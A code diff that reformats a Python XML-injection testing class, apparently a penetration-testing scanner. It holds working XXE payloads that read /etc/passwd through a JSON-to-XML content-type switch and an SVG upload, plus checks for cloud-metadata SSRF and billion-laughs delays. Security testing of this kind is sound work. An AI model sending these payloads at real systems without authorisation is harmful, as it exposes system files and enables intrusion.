@@ -61,9 +61,7 @@ class XMLInjectionTestAgent:
         if not requests:
             return None
         try:
-            return requests.post(
-                f"{self.target_url}{path}", json=data, timeout=timeout
-            )
+            return requests.post(f"{self.target_url}{path}", json=data, timeout=timeout)
         except requests.RequestException:
             return None
 
@@ -80,7 +78,8 @@ class XMLInjectionTestAgent:
 
             indicators = {
                 "file_read_linux": "root:" in resp.text,
-                "file_read_windows": "[fonts]" in resp.text or "extensions" in resp.text.lower(),
+                "file_read_windows": "[fonts]" in resp.text
+                or "extensions" in resp.text.lower(),
                 "ssrf_http": "ami-id" in resp.text or "instance-id" in resp.text,
                 "parameter_entity": resp.status_code == 200,
                 "billion_laughs": resp.elapsed.total_seconds() > 5,
@@ -88,18 +87,24 @@ class XMLInjectionTestAgent:
             }
 
             if indicators.get(name, False):
-                severity = "critical" if "file_read" in name or "ssrf" in name else "high"
-                results.append({
-                    "payload": name,
-                    "status": resp.status_code,
-                    "response_preview": resp.text[:200],
-                    "vulnerable": True,
-                })
-                self.findings.append({
-                    "severity": severity,
-                    "type": "XXE",
-                    "detail": f"{name} successful at {endpoint}",
-                })
+                severity = (
+                    "critical" if "file_read" in name or "ssrf" in name else "high"
+                )
+                results.append(
+                    {
+                        "payload": name,
+                        "status": resp.status_code,
+                        "response_preview": resp.text[:200],
+                        "vulnerable": True,
+                    }
+                )
+                self.findings.append(
+                    {
+                        "severity": severity,
+                        "type": "XXE",
+                        "detail": f"{name} successful at {endpoint}",
+                    }
+                )
         return results
 
     def test_xpath_injection(self, endpoint, field_name="username"):
@@ -112,43 +117,49 @@ class XMLInjectionTestAgent:
                 continue
 
             if resp.status_code == 200 and len(resp.text) > 50:
-                results.append({
-                    "payload": payload,
-                    "status": resp.status_code,
-                    "response_length": len(resp.text),
-                })
-                self.findings.append({
-                    "severity": "high",
-                    "type": "XPath Injection",
-                    "detail": f"XPath injection at {endpoint} with '{payload[:30]}'",
-                })
+                results.append(
+                    {
+                        "payload": payload,
+                        "status": resp.status_code,
+                        "response_length": len(resp.text),
+                    }
+                )
+                self.findings.append(
+                    {
+                        "severity": "high",
+                        "type": "XPath Injection",
+                        "detail": f"XPath injection at {endpoint} with '{payload[:30]}'",
+                    }
+                )
         return results
 
     def test_content_type_switch(self, endpoint, original_json=None):
         """Test if endpoint accepts XML when JSON is expected."""
         payload = original_json or {"username": "test", "password": "test"}
         xml_equiv = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
-        xml_equiv += f'<root><username>&xxe;</username><password>test</password></root>'
+        xml_equiv += f"<root><username>&xxe;</username><password>test</password></root>"
 
         resp = self._post_xml(endpoint, xml_equiv)
         if resp and resp.status_code in (200, 201):
             accepted = True
             if "root:" in resp.text:
-                self.findings.append({
-                    "severity": "critical",
-                    "type": "Content-Type Switch XXE",
-                    "detail": f"Endpoint {endpoint} accepts XML with XXE when JSON expected",
-                })
+                self.findings.append(
+                    {
+                        "severity": "critical",
+                        "type": "Content-Type Switch XXE",
+                        "detail": f"Endpoint {endpoint} accepts XML with XXE when JSON expected",
+                    }
+                )
             return {"accepted": accepted, "status": resp.status_code}
         return {"accepted": False}
 
     def test_svg_xxe(self, upload_endpoint, field_name="file"):
         """Test SVG file upload for XXE."""
-        svg_xxe = '''<?xml version="1.0" encoding="UTF-8"?>
+        svg_xxe = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text x="0" y="20">&xxe;</text>
-</svg>'''
+</svg>"""
 
         if not requests:
             return {"error": "requests not available"}
@@ -159,11 +170,13 @@ class XMLInjectionTestAgent:
                 timeout=15,
             )
             if resp and "root:" in resp.text:
-                self.findings.append({
-                    "severity": "critical",
-                    "type": "SVG XXE",
-                    "detail": f"SVG upload at {upload_endpoint} triggers XXE",
-                })
+                self.findings.append(
+                    {
+                        "severity": "critical",
+                        "type": "SVG XXE",
+                        "detail": f"SVG upload at {upload_endpoint} triggers XXE",
+                    }
+                )
                 return {"vulnerable": True}
         except requests.RequestException:
             pass
